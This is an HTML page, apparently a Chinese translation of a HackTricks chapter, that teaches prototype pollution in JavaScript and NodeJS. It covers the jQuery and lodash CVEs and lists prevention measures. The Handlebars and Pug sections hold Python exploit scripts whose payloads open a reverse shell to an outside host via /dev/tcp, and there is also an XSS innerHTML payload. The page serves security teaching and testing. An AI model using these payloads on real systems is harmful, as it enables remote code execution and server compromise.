<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>NodeJS - __proto__ &amp; prototype Pollution</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="nodejs---__proto__--prototype-pollution"><a class="header" href="#nodejs---__proto__--prototype-pollution">NodeJS - __proto__ &amp; prototype Pollution</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="javascript-中的对象"><a class="header" href="#javascript-中的对象">JavaScript 中的对象 <a href="#id-053a" id="id-053a"></a></a></h2>
<p>JavaScript 中的对象本质上是键值对的集合，称为属性。可以使用 <code>Object.create</code> 并将 <code>null</code> 作为参数来创建一个空对象。此方法允许创建一个没有任何继承属性的对象。</p>
<pre><code class="language-javascript">// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
</code></pre>
<p>一个空对象类似于一个空字典，表示为<code>{}</code>。</p>
<h3 id="javascript中的函数和类"><a class="header" href="#javascript中的函数和类">JavaScript中的函数和类</a></h3>
<p>在JavaScript中，类和函数密切相关，函数通常作为类的构造函数。尽管JavaScript缺乏原生类支持，但构造函数可以模拟类的行为。</p>
<pre><code class="language-javascript">// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
</code></pre>
<h3 id="prototypes-in-javascript"><a class="header" href="#prototypes-in-javascript">Prototypes in JavaScript</a></h3>
<p>JavaScript 允许在运行时修改、添加或删除原型属性。这种灵活性使得类功能的动态扩展成为可能。</p>
<p>像 <code>toString</code> 和 <code>valueOf</code> 这样的函数可以被改变以改变它们的行为，展示了 JavaScript 原型系统的适应性。</p>
<h2 id="inheritance"><a class="header" href="#inheritance">Inheritance</a></h2>
<p>在基于原型的编程中，属性/方法由对象从类中继承。这些类是通过将属性/方法添加到另一个类的实例或一个空对象来创建的。</p>
<p>需要注意的是，当一个属性被添加到作为其他对象原型的对象（例如 <code>myPersonObj</code>）时，继承的对象可以访问这个新属性。然而，除非明确调用，否则这个属性不会自动显示。</p>
<h2 id="__proto__-pollution"><a class="header" href="#__proto__-pollution">__proto__ pollution <a href="#id-0d0a" id="id-0d0a"></a></a></h2>
<h2 id="exploring-prototype-pollution-in-javascript"><a class="header" href="#exploring-prototype-pollution-in-javascript">Exploring Prototype Pollution in JavaScript</a></h2>
<p>JavaScript 对象由键值对定义，并从 JavaScript 对象原型继承。这意味着改变对象原型可以影响环境中的所有对象。</p>
<p>让我们用一个不同的例子来说明：</p>
<pre><code class="language-javascript">function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
</code></pre>
<p>通过以下方式可以访问 Object 原型：</p>
<pre><code class="language-javascript">car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
</code></pre>
<p>通过向 Object 原型添加属性，每个 JavaScript 对象将继承这些新属性：</p>
<pre><code class="language-javascript">function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
</code></pre>
<h2 id="prototype-pollution"><a class="header" href="#prototype-pollution">prototype pollution</a></h2>
<p>对于<code>__proto__</code>使用受到限制的场景，修改函数的原型是一个替代方案：</p>
<pre><code class="language-javascript">function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
</code></pre>
<p>这仅影响从 <code>Vehicle</code> 构造函数创建的对象，使它们具有 <code>beep</code>、<code>hasWheels</code>、<code>honk</code> 和 <code>isElectric</code> 属性。</p>
<p>通过原型污染全局影响 JavaScript 对象的两种方法包括：</p>
<ol>
<li>直接污染 <code>Object.prototype</code>：</li>
</ol>
<pre><code class="language-javascript">Object.prototype.goodbye = function() { console.log("Goodbye!"); };
</code></pre>
<ol start="2">
<li>污染常用结构的构造函数原型：</li>
</ol>
<pre><code class="language-javascript">var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
</code></pre>
<p>在这些操作之后，每个 JavaScript 对象都可以执行 <code>goodbye</code> 和 <code>greet</code> 方法。</p>
<h2 id="污染其他对象"><a class="header" href="#污染其他对象">污染其他对象</a></h2>
<h3 id="从类到-objectprototype"><a class="header" href="#从类到-objectprototype">从类到 Object.prototype</a></h3>
<p>在一个可以<strong>污染特定对象</strong>的场景中，如果你需要<strong>到达 <code>Object.prototype</code></strong>，你可以使用以下代码进行搜索：</p>
<pre><code class="language-javascript">// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
</code></pre>
<h3 id="数组元素污染"><a class="header" href="#数组元素污染">数组元素污染</a></h3>
<p>注意，由于您可以污染 JS 中对象的属性，如果您有权污染数组，您也可以通过 <strong>索引</strong> 污染 <strong>数组的值</strong>（请注意，您无法覆盖值，因此您需要污染以某种方式使用但未被写入的索引）。</p>
<pre><code class="language-javascript">c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
</code></pre>
<h3 id="html-elements-pollution"><a class="header" href="#html-elements-pollution">Html elements pollution</a></h3>
<p>通过 JS 生成 HTML 元素时，可以 <strong>覆盖</strong> <strong><code>innerHTML</code></strong> 属性，使其写入 <strong>任意 HTML 代码。</strong> <a href="https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/">这个写作的想法和示例</a>.</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=&lt;"svg onload=alert(1)&gt;"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="&lt;svg onload=alert(document.domain)&gt;"
</code></pre>
<p>{% endcode %}</p>
<h2 id="示例"><a class="header" href="#示例">示例</a></h2>
<h3 id="基本示例"><a class="header" href="#基本示例">基本示例</a></h3>
<p>原型污染是由于应用程序中的缺陷导致的，该缺陷允许覆盖 <code>Object.prototype</code> 上的属性。这意味着大多数对象从 <code>Object.prototype</code> 派生其属性。</p>
<p>最简单的示例是向一个<strong>未定义属性的对象</strong>添加一个值，该对象将被检查，例如：</p>
<pre><code class="language-javascript">if (user.admin) {
</code></pre>
<p>如果属性 <strong><code>admin</code> 未定义</strong>，则可以利用 PP 并将其设置为 True，例如：</p>
<pre><code class="language-javascript">Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
</code></pre>
<p>该机制涉及操纵属性，以便如果攻击者控制某些输入，他们可以修改应用程序中所有对象的原型。这种操纵通常涉及设置 <code>__proto__</code> 属性，在 JavaScript 中，这与直接修改对象的原型同义。</p>
<p>成功执行此攻击的条件，如特定 <a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">研究</a> 中所述，包括：</p>
<ul>
<li>执行递归合并。</li>
<li>根据路径定义属性。</li>
<li>克隆对象。</li>
</ul>
<h3 id="override-function"><a class="header" href="#override-function">Override function</a></h3>
<pre><code class="language-python">customer.__proto__.toString = ()=&gt;{alert("polluted")}
</code></pre>
<h3 id="原型污染到-rce"><a class="header" href="#原型污染到-rce">原型污染到 RCE</a></h3>
<p>{% content-ref url="prototype-pollution-to-rce.md" %}
<a href="prototype-pollution-to-rce.html">prototype-pollution-to-rce.md</a>
{% endcontent-ref %}</p>
<p>其他有效载荷：</p>
<ul>
<li><a href="https://github.com/KTH-LangSec/server-side-prototype-pollution">https://github.com/KTH-LangSec/server-side-prototype-pollution</a></li>
</ul>
<h2 id="客户端原型污染到-xss"><a class="header" href="#客户端原型污染到-xss">客户端原型污染到 XSS</a></h2>
<p>{% content-ref url="client-side-prototype-pollution.md" %}
<a href="client-side-prototype-pollution.html">client-side-prototype-pollution.md</a>
{% endcontent-ref %}</p>
<h3 id="cve-201911358通过-jquery--extend-的原型污染攻击"><a class="header" href="#cve-201911358通过-jquery--extend-的原型污染攻击">CVE-2019–11358：通过 jQuery $ .extend 的原型污染攻击</a></h3>
<p><a href="https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7">有关更多详细信息，请查看本文</a> 在 jQuery 中，<code>$ .extend</code> 函数如果深拷贝功能使用不当，可能导致原型污染。此函数通常用于克隆对象或合并默认对象的属性。然而，当配置错误时，原本用于新对象的属性可能会被分配给原型。例如：</p>
<pre><code class="language-javascript">$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
</code></pre>
<p>这个漏洞被识别为 CVE-2019–11358，说明深拷贝如何无意中修改原型，从而导致潜在的安全风险，例如如果像 <code>isAdmin</code> 这样的属性在没有适当存在验证的情况下被检查，可能会导致未经授权的管理员访问。</p>
<h3 id="cve-20183721-cve-201910744-通过-lodash-的原型污染攻击"><a class="header" href="#cve-20183721-cve-201910744-通过-lodash-的原型污染攻击">CVE-2018–3721, CVE-2019–10744: 通过 lodash 的原型污染攻击</a></h3>
<p><a href="https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7">有关更多详细信息，请查看这篇文章</a></p>
<p><a href="https://www.npmjs.com/package/lodash">Lodash</a> 遇到了类似的原型污染漏洞 (CVE-2018–3721, CVE-2019–10744)。这些问题在版本 4.17.11 中得到了修复。</p>
<h3 id="另一个包含-cve-的教程"><a class="header" href="#另一个包含-cve-的教程">另一个包含 CVE 的教程</a></h3>
<p>{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}</p>
<h3 id="检测原型污染的工具"><a class="header" href="#检测原型污染的工具">检测原型污染的工具</a></h3>
<ul>
<li><a href="https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner"><strong>Server-Side-Prototype-Pollution-Gadgets-Scanner</strong></a>: Burp Suite 扩展，旨在检测和分析 Web 应用程序中的服务器端原型污染漏洞。该工具自动化扫描请求的过程，以识别潜在的原型污染问题。它利用已知的工具 - 利用原型污染执行有害操作的方法 - 特别关注 Node.js 库。</li>
<li><a href="https://github.com/portswigger/server-side-prototype-pollution"><strong>server-side-prototype-pollution</strong></a>: 该扩展识别服务器端原型污染漏洞。它使用在 <a href="https://portswigger.net/research/server-side-prototype-pollution">server side prototype pollution</a> 中描述的技术。</li>
</ul>
<h3 id="nodejs-中的-ast-原型污染"><a class="header" href="#nodejs-中的-ast-原型污染">NodeJS 中的 AST 原型污染</a></h3>
<p>NodeJS 在 JavaScript 中广泛使用抽象语法树 (AST) 进行模板引擎和 TypeScript 等功能。本节探讨与模板引擎中原型污染相关的漏洞，特别是 Handlebars 和 Pug。</p>
<h4 id="handlebars-漏洞分析"><a class="header" href="#handlebars-漏洞分析">Handlebars 漏洞分析</a></h4>
<p>Handlebars 模板引擎易受原型污染攻击。该漏洞源于 <code>javascript-compiler.js</code> 文件中的特定函数。例如，<code>appendContent</code> 函数在存在时会连接 <code>pendingContent</code>，而 <code>pushSource</code> 函数在添加源后将 <code>pendingContent</code> 重置为 <code>undefined</code>。</p>
<p><strong>利用过程</strong></p>
<p>利用 Handlebars 生成的 AST（抽象语法树），遵循以下步骤：</p>
<ol>
<li><strong>解析器的操控</strong>：最初，解析器通过 <code>NumberLiteral</code> 节点强制值为数字。原型污染可以规避这一点，从而允许插入非数字字符串。</li>
<li><strong>编译器的处理</strong>：编译器可以处理 AST 对象或字符串模板。如果 <code>input.type</code> 等于 <code>Program</code>，则输入被视为预解析，这可以被利用。</li>
<li><strong>代码注入</strong>：通过操控 <code>Object.prototype</code>，可以将任意代码注入模板函数，这可能导致远程代码执行。</li>
</ol>
<p>一个演示 Handlebars 漏洞利用的示例：</p>
<pre><code class="language-javascript">const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
</code></pre>
<p>这段代码展示了攻击者如何将任意代码注入到 Handlebars 模板中。</p>
<p><strong>外部参考</strong>：在 'flat' 库中发现了与原型污染相关的问题，详细信息见此处：<a href="https://github.com/hughsk/flat/issues/105">GitHub 问题</a>。</p>
<p><strong>外部参考</strong>：<a href="https://github.com/hughsk/flat/issues/105">与 'flat' 库中的原型污染相关的问题</a></p>
<p>Python 中原型污染利用的示例：</p>
<pre><code class="language-python">import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
</code></pre>
<h4 id="pug-漏洞"><a class="header" href="#pug-漏洞">Pug 漏洞</a></h4>
<p>Pug，另一个模板引擎，面临着类似的原型污染风险。详细信息可在关于 <a href="https://blog.p6.is/AST-Injection/#Pug">Pug 中的 AST 注入</a> 的讨论中找到。</p>
<p>Pug 中原型污染的示例：</p>
<pre><code class="language-python">import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1'`)"
}
})

# execute
requests.get(TARGET_URL)
</code></pre>
<h3 id="预防措施"><a class="header" href="#预防措施">预防措施</a></h3>
<p>为了降低原型污染的风险，可以采用以下策略：</p>
<ol>
<li><strong>对象不可变性</strong>：可以通过应用 <code>Object.freeze</code> 来使 <code>Object.prototype</code> 不可变。</li>
<li><strong>输入验证</strong>：JSON 输入应严格根据应用程序的架构进行验证。</li>
<li><strong>安全合并函数</strong>：应避免不安全的递归合并函数使用。</li>
<li><strong>无原型对象</strong>：可以使用 <code>Object.create(null)</code> 创建没有原型属性的对象。</li>
<li><strong>使用 Map</strong>：应使用 <code>Map</code> 来存储键值对，而不是 <code>Object</code>。</li>
<li><strong>库更新</strong>：通过定期更新库来纳入安全补丁。</li>
<li><strong>Linter 和静态分析工具</strong>：使用像 ESLint 这样的工具及适当的插件来检测和防止原型污染漏洞。</li>
<li><strong>代码审查</strong>：实施全面的代码审查，以识别和修复与原型污染相关的潜在风险。</li>
<li><strong>安全培训</strong>：教育开发人员了解原型污染的风险及编写安全代码的最佳实践。</li>
<li><strong>谨慎使用库</strong>：在使用第三方库时要谨慎。评估其安全态势并审查其代码，特别是那些操作对象的库。</li>
<li><strong>运行时保护</strong>：采用运行时保护机制，例如使用安全导向的 npm 包，这些包可以检测和防止原型污染攻击。</li>
</ol>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></li>
<li><a href="https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l">https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l</a></li>
<li><a href="https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7">https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7</a></li>
<li><a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></li>
</ul>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../pentesting-web/deserialization/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../pentesting-web/deserialization/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
